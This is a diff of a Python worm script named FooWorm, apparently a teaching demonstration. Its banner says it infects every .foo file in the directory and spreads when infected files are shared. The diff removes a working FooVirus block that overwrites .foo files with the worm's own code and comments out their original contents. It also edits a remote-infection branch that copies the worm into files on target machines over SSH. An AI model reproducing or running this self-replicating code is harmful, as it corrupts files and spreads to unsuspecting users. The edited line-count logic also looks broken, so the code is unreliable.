@@ -9,7 +9,6 @@ import os
 import random
 import paramiko
 import scp
-import select
 import signal
 
 print("""\nHELLO FROM FooWorm\n\n""")
@@ -17,22 +16,6 @@ print("""This is a demonstration of how easy it is to write a self-replicating p
 This worm will infect all files with names ending in .foo in the directory in which you execute an infected file.  
 If you send an infected file to someone else and they execute it, their, foo files will be damaged also muhahahaha.\n\n""")        
 
-# FooVirus.py starts here
-IN = open(sys.argv[0], 'r')
-fooworm = [line for (i,line) in enumerate(IN) if i < 201]
-
-for item in os.listdir():
-    if item.endswith(".foo"):
-        IN = open(item, 'r')
-        all_of_it = IN.readlines()
-        IN.close()
-        if any('FooWorm' in line for line in all_of_it): continue       # if the file is already infected, skip it
-        os.chmod(item, 0o777)
-        OUT = open(item, 'w')
-        OUT.writelines(fooworm)
-        all_of_it = ['#' + line for line in all_of_it]
-        OUT.writelines(all_of_it)
-        OUT.close()
 
 # AbraWorm.py starts here
 def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
@@ -167,7 +150,8 @@ while True:
                     print("\nWill now try to infect the files first with FooVirus")
                     # FooVirus.py starts here
                     IN = open(sys.argv[0], 'r')
-                    fooworm = [line for (i,line) in enumerate(IN) if i < 220]
+                    length = len(IN.readlines())
+                    fooworm = [line for (i,line) in enumerate(IN) if i < length]
 
                     for filename in files_of_interest_at_target:
                         IN = open(filename, 'r')
